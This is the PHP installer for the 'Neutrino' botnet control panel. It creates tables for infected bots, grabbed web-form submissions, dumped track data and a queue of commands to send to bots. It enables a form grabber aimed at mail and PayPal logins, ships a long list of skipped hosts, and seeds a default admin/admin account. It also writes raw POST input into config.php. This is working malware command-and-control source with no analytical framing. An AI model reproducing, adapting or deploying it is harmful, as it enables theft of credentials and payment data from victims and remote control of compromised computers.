<?php
header('Content-Type: text/html; charset=utf8');
define('N3N', 1);

include("config.php");
include("functions.php");

$banned = "CREATE TABLE IF NOT EXISTS `banned` (" .
    "`id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT," .
    "`ip` VARCHAR(25) NOT NULL," .
    "`useragent` TEXT NOT NULL," .
    "`ref` TEXT NOT NULL," .
    "PRIMARY KEY (`id`)" .
    ") ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci AUTO_INCREMENT=1 ;";

$botnet_bots = "CREATE TABLE IF NOT EXISTS `botnet_bots` (" .
    "`bot_uid` VARCHAR(255) NOT NULL DEFAULT ''," .
    "`bot_os` TEXT NOT NULL," .
    "`bot_name` TEXT NOT NULL," .
    "`bot_version` TEXT NOT NULL," .
    "`bot_ip` TEXT NOT NULL," .
    "`bot_time` TEXT NOT NULL," .
    "`bot_date` TEXT NOT NULL," .
    "`bot_av` TEXT NOT NULL," .
    "`bot_country` TEXT NOT NULL," .
    "`bot_quality` TEXT NOT NULL," .
    "PRIMARY KEY (`bot_uid`)" .
    ") ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";

$botnet_ff = "CREATE TABLE IF NOT EXISTS `botnet_ff` (" .
    "`bot_ip` TEXT NOT NULL," .
    "`bot_uid` TEXT NOT NULL," .
    "`bot_host` TEXT NOT NULL," .
    "`bot_form` TEXT NOT NULL," .
    "`bot_form_hash` VARCHAR(32) NOT NULL DEFAULT ''," .
    "`bot_browser` TEXT NOT NULL," .
    "`bot_date` TEXT DEFAULT NULL," .
    "`bot_time` TEXT DEFAULT NULL," .
    "PRIMARY KEY (`bot_form_hash`)" .
    ") ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";

$botnet_dumps = "CREATE TABLE IF NOT EXISTS `botnet_dumps` (" .
    "`bot_ip` TEXT NOT NULL," .
    "`track_type` TEXT NOT NULL," .
    "`track_data` TEXT NOT NULL," .
    "`bot_date` TEXT NOT NULL," .
    "`bot_time` TEXT NOT NULL," .
    "`track_hash` VARCHAR(32) NOT NULL DEFAULT ''," .
    "PRIMARY KEY (`track_hash`)" .
    ") ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";

$botnet_config = "CREATE TABLE IF NOT EXISTS `botnet_config` (" .
    "`refresh_id` TEXT NOT NULL," .
    "`refresh_rate` TEXT NOT NULL" .
    ") ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";

$botnet_config_rate = "INSERT INTO `botnet_config` (`refresh_id`, `refresh_rate`) VALUES" .
    "('1401076386715766', '5');";

$botnet_tasks = "CREATE TABLE IF NOT EXISTS `botnet_tasks` (" .
    "`id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT," .
    "`task_id` TEXT NOT NULL," .
    "`task_date` TEXT NOT NULL," .
    "`tasks_pref` TEXT NOT NULL," .
    "`command` TEXT NOT NULL," .
    "`tasks_postf` TEXT NOT NULL," .
    "`status` TEXT NOT NULL," .
    "`by_user` TEXT NOT NULL," .
    "`execs` TEXT NOT NULL," .
    "`needexecs` TEXT NOT NULL," .
    "`failed` TEXT NOT NULL," .
    "`bots` TEXT NOT NULL," .
    "PRIMARY KEY (`id`)" .
    ") ENGINE=MyISAM  CHARACTER SET utf8 COLLATE utf8_general_ci AUTO_INCREMENT=272 ;";

$p_layer = "CREATE TABLE IF NOT EXISTS `p_layer` (" .
    "`layer_url` VARCHAR(128) NOT NULL DEFAULT ''," .
    "`layer_cktime` TEXT NOT NULL," .
    "`layer_ckdate` TEXT," .
    "PRIMARY KEY (`layer_url`)" .
    ") ENGINE=MyISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";

$users = "CREATE TABLE IF NOT EXISTS `users` (" .
    "`uid` VARCHAR(64) DEFAULT NULL," .
    "`username` VARCHAR(64) DEFAULT NULL," .
    "`password` VARCHAR(64) DEFAULT NULL," .
    "`type` VARCHAR(64) DEFAULT NULL," .
    "`sid` VARCHAR(64) DEFAULT NULL," .
    "PRIMARY KEY (`uid`)" .
    ") ENGINE=MyISAM  CHARACTER SET utf8 COLLATE utf8_general_ci;";

$ff_enabled = "CREATE TABLE IF NOT EXISTS `formgrabber_enabled` (" .
    "`enabled` TEXT COLLATE utf8_unicode_ci NOT NULL" .
    ") ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;";

$ff_on = "INSERT INTO `formgrabber_enabled` (`enabled`) VALUES ('on');";

$ff_host = "CREATE TABLE IF NOT EXISTS `formgrabber_host` (".
"`hostnames` text COLLATE utf8_unicode_ci NOT NULL,".
 " `block` text COLLATE utf8_unicode_ci NOT NULL".
") ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;";

$ff_sett = "INSERT INTO `formgrabber_host` (`hostnames`, `block`) VALUES".
"('capture_all', '.microsoft.com\r\ntiles.services.mozilla.com\r\nservices.mozilla.com\r\n.mcafee.com\r\nvs.mcafeeasap.com\r\nscan.pchealthadvisor.com\r\navg.com\r\nrrs.symantec.com\r\nsjremetrics.java.com\r\nyahoo.com/hjsal	\r\n.msg.yahoo.com\r\ngames.yahoo.com\r\n.toolbar.yahoo.com\r\nquery.yahoo.com\r\nyahoo.com/pjsal\r\neBayISAPI.dll?VISuperSize&item=\r\nbeap.bc.yahoo.com\r\n.mail.yahoo.com/ws/mail/v1/formrpc?appid=YahooMailClassic\r\n.mail.yahoo.com/dc/troubleLoading\r\n.mail.yahoo.com/mc/compose\r\nmail.yahoo.com/mc/showFolder\r\nmail.yahoo.com/mc/showMessage\r\ninstallerstats.yahoo.com\r\nlogin.yahoo.com/openid/op/start\r\nmail.yahoo.com/mc/showFolder\r\nyahoo.com/mc/showMessage\r\nmail.yahoo.com/mc/compose\r\naddress.mail.yahoo.com/yab\r\naddress.yahoo.com\r\nanalytics.yahoo.com\r\ngeo.yahoo.com\r\nnews.yahoo.com\r\nmessages.finance.yahoo.com\r\ninstallerstats.yahoo.com\r\nmail.yahoo.com/ws/\r\nmail.yahoo.com/dc/\r\nsports.yahoo.com\r\nomg.yahoo.com\r\nshine.yahoo.com\r\ndesktop.google\r\ndesign60.weatherbug.com\r\noogle.com/tbproxy/\r\noogle.com/mail/channel/\r\noogle.com/bookmarks\r\ngle-analytics.com/collect\r\nmaps.google\r\nnews.google\r\ngoogleapis.com\r\noogle.com/u/0/\r\noogle.com/u/1/\r\noogle.com/u/2/\r\noogle.com/u/3/\r\noogle.com/u/4/\r\noogle.com/a/\r\noogle.com/b/\r\nogle.com/_/n/\r\nogle.com/_/initialdata\r\noogle.com/_/photos\r\noogle.com/mail/h/\r\noogle.com/mail/u/\r\noogle.com/_/jserror\r\noogle.com/_/diagnostics\r\noogle.com/_/socialgraph\r\noogle.com/_/savetz\r\noogle.com/_/profiles\r\noogle.com/_/og/promos\r\noogle.com/analytics/web/\r\noogle.com/bind\r\noogle.com/client-channel/channel/\r\noogle.com/cloudsearch/\r\noogle.com/document/\r\noogle.com/dr\r\noogle.com/act\r\noogle.com/pref\r\noogle.com/cp\r\noogle.com/drive/\r\noogle.com/o/oauth2/\r\noogle.com/picker/\r\noogle.com/stat\r\noogle.com/spreadsheets/\r\noogle.com/uploadstats\r\noogle.com/upload/\r\noogle.com/talkgadget\r\noogle.com/translate\r\noogle.com/voice/v1/\r\noogle.com/vr\r\noogle.com/_vti_bin\r\napis.google\r\noogle.com/mail/?ui\r\noogle.com/calendar\r\nogle.com/logos/\r\noglevideo.com\r\noglesyndication.com/activeview\r\nreddit.com/api/\r\ngeo.opera.com\r\n.com/do/mail/message/\r\nhttpcs.msg.yahoo.com/\r\npnrws.skype.com/api\r\nmail.aol.com\r\ndailymotion.com/cookie/\r\netsy.com/s2/service/\r\netsy.com/api/\r\netsy.com/people/\r\netsy.com/add_favorite\r\netsy.com/search\r\nconnect.facebook.com/widgets\r\nupload.facebook.com\r\nconnect.facebook.com\r\napi.facebook.com\r\napps.facebook.com\r\ngraph.facebook.com\r\nfacebook.mafiawars.com\r\nfacebook.com/ads/\r\nfacebook.com/alite/push/log.php\r\nfacebook.com/ajax/\r\nfacebook.com/bookmark/\r\nfacebook.com/chat/\r\nfacebook.com/connect/\r\nfacebook.com/checkpoint/\r\nfacebook.com/crop_profile_pic.php\r\nfacebook.com/editnote.php\r\nfacebook.com/ego/feed/\r\nfacebook.com/dialog/\r\nfacebook.com/events/\r\nfacebook.com/friends\r\nfacebook.com/find-friends/\r\nfacebook.com/growth/\r\nfacebook.com/intl/\r\nfacebook.com/logout\r\nfacebook.com/mobile/\r\nfacebook.com/photos/\r\nfacebook.com/video/\r\nfacebook.com/plugins/\r\nfacebook.com/people/\r\nfacebook.com/privacy/selector/\r\nfacebook.com/profile/picture/\r\nfacebook.com/pubcontent/\r\nfacebook.com/requests/friends/ajax/\r\nfacebook.com/residence/\r\nfacebook.com/roadblock/\r\nfacebook.com/stickers/\r\nfacebook.com/search/live_conversation/\r\nfacebook.com/structured_suggestion/\r\nfacebook.com/timeline/\r\nfacebook.com/tr/\r\nfacebook.com/translations/\r\ninstagram.com/query/\r\ninstagram.com/client_action/\r\nflickr.com/fragment\r\nflickr.com/photo\r\nflickr.com/mail/write\r\nflickr.com/groups\r\nflickr.com/services\r\nflickr.com/people/\r\ntwitter.com/logout\r\ntwitter.com/i/\r\nlinkedin.com/lite/\r\nlinkedin.com/connections\r\nlinkedin.com/people/\r\nlinkedin.com/languageSelector\r\nlinkedin.com/home?trk\r\nlinkedin.com/wvmx/\r\nmyspace.com/beacon/\r\nmyspace.com/ajax/\r\nok.ru/app\r\nok.ru/gwtlog\r\nok.ru/?cmd\r\nok.ru/dk\r\nok.ru/feed\r\nok.ru/game\r\nok.ru/profile\r\nok.ru/push\r\nplayer.vimeo.com\r\nsgsapps.com\r\nmyfarmvillage.com\r\napi.connect.facebook.com\r\nupload.youtube.com\r\nyoutube.com/addto_ajax\r\nyoutube.com/annotations\r\nyoutube.com/api/\r\nyoutube.com/channel_ajax\r\nyoutube.com/comment_voting\r\nyoutube.com/comments_ajax\r\nyoutube.com/comment_servlet\r\nyoutube.com/inbox_ajax\r\nyoutube.com/live_stats\r\nyoutube.com/logout\r\nyoutube.com/metadata_ajax\r\nyoutube.com/playlist_video_ajax\r\nyoutube.com/subscription_ajax\r\nyoutube.com/set_awesome\r\nyoutube.com/video_info_ajax\r\nyoutube.com/video_response_upload\r\nyoutube.com/watch_actions_ajax\r\nyoutube.com/watch_fragments_ajax\r\nyoutube.com/watch_promo_ajax\r\nnetzero.net/webmail\r\nnetmail.verizon.com/netmail/driver\r\nverizon.com/webmail/driver\r\nidp.comcast.net/idp\r\noptimum.net/mail/dd\r\nwww.msn.com/?wa=wsignin1.0\r\nusers.storage.live.com/users/\r\naccount.live.com/API/\r\nmail.live.com/mail/mail.fpp\r\nmail.live.com/mail/options\r\nmail.live.com/ol/\r\nmail.live.com/Handlers/\r\nofficeapps.live.com/wv/\r\nlive.com/mail/SilverlightAttachmentUploader\r\nlive.com/c.gif\r\nlive.com/Handlers/\r\ncox.net/dashboard\r\nenhanced.charter.net\r\npost.craigslist.org\r\namazon.com/gp/history/\r\namazon.com/gp/charity/\r\namazon.com/gp/deal/\r\namazon.com/gp/gw/\r\namazon.com/gp/product/\r\namazon.com/gp/redirection/\r\namazon.com/gp/quick-abn-finder/\r\namazon.com/gp/registry/wishlist/');";


$ff_hostname = "INSERT INTO `formgrabber_host` (`hostnames`) VALUES ('live,mail,paypal')";

$users_adm = "INSERT INTO `users` (`uid`, `username`, `password`, `type`, `sid`) VALUES" .
    "('admin', 'admin', 'admin', 'root', '');";

function install($db_hostname, $db_name, $db_username, $db_password)
{
    global $ff_sett, $banned, $botnet_bots, $botnet_ff, $botnet_dumps, $botnet_config, $botnet_config_rate, $botnet_tasks, $p_layer, $users, $users_adm, $ff_enabled, $ff_on, $ff_host, $ff_hostname;

    $connect = mysql_connect($db_hostname, $db_username, $db_password) or die ("<b>Could not connect: </b>" . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");

    if (!mysql_query("CREATE DATABASE IF NOT EXISTS $db_name")) {
        die('<b>Cant\'t create database : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
    mysql_select_db($db_name);

    if (!mysql_query($banned)) {
        die('<b>Cant\'t create table "banned" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }

    if (!mysql_query($botnet_bots)) {
        die('<b>Cant\'t create table "botnet_bots" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
    if (!mysql_query($botnet_ff)) {
        die('<b>Cant\'t create table "botnet_ff" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
    if (!mysql_query($botnet_dumps)) {
        die('<b>Cant\'t create table "botnet_dumps" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }

    if (!mysql_query($botnet_config)) {
        die('<b>Cant\'t create table "botnet_config" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }

    if (!mysql_query($botnet_config_rate)) {
        die('<b>Cant\'t insert table "botnet_config - rate" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }

    if (!mysql_query($botnet_tasks)) {
        die('<b>Cant\'t create table "botnet_tasks" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }

    if (!mysql_query($p_layer)) {
        die('<b>Cant\'t create table "p_layer" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }

    if (!mysql_query($users)) {
        die('<b>Cant\'t create table "users" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
	
    if (!mysql_query($ff_enabled)) {
        die('<b>Cant\'t insert table "formgrabber_enabled" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
    if (!mysql_query($ff_on)) {
        die('<b>Cant\'t insert table "ff_on" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
    if (!mysql_query($ff_host)) {
        die('<b>Cant\'t insert table "ff_host" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
    if (!mysql_query($ff_sett)) {
        die('<b>Cant\'t insert table "ff_host" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }

    if (!mysql_query($ff_hostname)) {
        die('<b>Cant\'t insert table "ff_hostname" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
    if (!mysql_query($ff_sett)) {
        die('<b>Cant\'t insert table "$ff_sett" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }

	
    if (!mysql_query($users_adm)) {
        die('<b>Cant\'t insert table "users - admin;admin" : </b>' . mysql_error() . "<br><a href=\"javascript:history.go(-1)\"><< Go back</a>");
    }
    mysql_close($connect);


    $config =
        '// Connection data' . PHP_EOL .
        '$db_host = "' . $_POST['dbhost'] . '";' . PHP_EOL .
        '$db_login = "' . $_POST['dbuser'] . '";' . PHP_EOL .
        '$db_password = "' . $_POST['dbpass'] . '";' . PHP_EOL .
        '$db_database = "' . $_POST['dbname'] . '";' . PHP_EOL .
        '$key_tologin = "' . $_POST['key'] . '";' . PHP_EOL .
        '// Connection data';

    $f = fopen('config.php', 'a');
    fwrite($f, $config . PHP_EOL);
    fclose($f);

    $finish = '<b>Neutrino successfully installed!</b><br>' .
        'Login page - http://' . implode('/', array_slice(explode('/', $_SERVER['SERVER_NAME'] . $_SERVER['PHP_SELF']), 0, -1)) . '/index.php?authkey=' . $_POST['key'] . '' .
        '<br>Password - admin;admin' .
        '<br>Delete this file!' .
        '<br>' .
        '<br>';

    die($finish);
}

if (isset($_POST['install'])) {
    if (empty($_POST['dbhost']) || empty($_POST['dbname']) || empty($_POST['dbuser']) || empty($_POST['key']))
        die("<b>Please fill in all fields!</b><br><a href=\"javascript:history.go(-1)\"><< Go back</a>");

    install($_POST['dbhost'], $_POST['dbname'], $_POST['dbuser'], $_POST['dbpass']);
}

?>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

    <title>Neutrino installer</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf8"/>
    <link href="css/bootstrap.css" rel="stylesheet" media="screen">
    <script src="js/jquery-latest.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/bootbox.min.js"></script>
    <script src="css/custom.css"></script>
    <br>
    <div class="panel panel-info" style="width: 40%;margin: 0 auto; text-align: center">
        <div class="panel-heading"><b>Neutrino installer</b></div>
        <div class="panel-body">
            <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                <input type="text" style="width: 90%" id="dbhost" class="form-control" name="dbhost"
                       placeholder="Database host :"><br><br>
                <input type="text" style="width: 90%" id="dbname" class="form-control" name="dbname"
                       placeholder="Database name :"><br><br>
                <input type="text" style="width: 90%" id="dbuser" class="form-control" name="dbuser"
                       placeholder="Database user :"><br><br>
                <input type="text" style="width: 90%" id="dbpass" class="form-control" name="dbpass"
                       placeholder="Database password :"><br><br>
                <input type="text" style="width: 90%" id="key" class="form-control" name="key"
                       placeholder="Secure key (random passphrase) :"><br>
                <br>
                <button type="submit" name="install" class="btn btn-info btn-block">Install</button>
				<br>
				<div class="alert alert-dismissible alert-warning" style="text-align:left">
  Before install - <br>
  Set "chmod 777" on file "config.php" and folders - logs/files/upload.<br>
  
  <br>
  <p style="text-align:center" class="text-danger"><strong>To use search you need installed MySQL 5.6 version or greater.</strong></p>
</div>
				
            </form>
        </div>
    </div>
<?php


die();
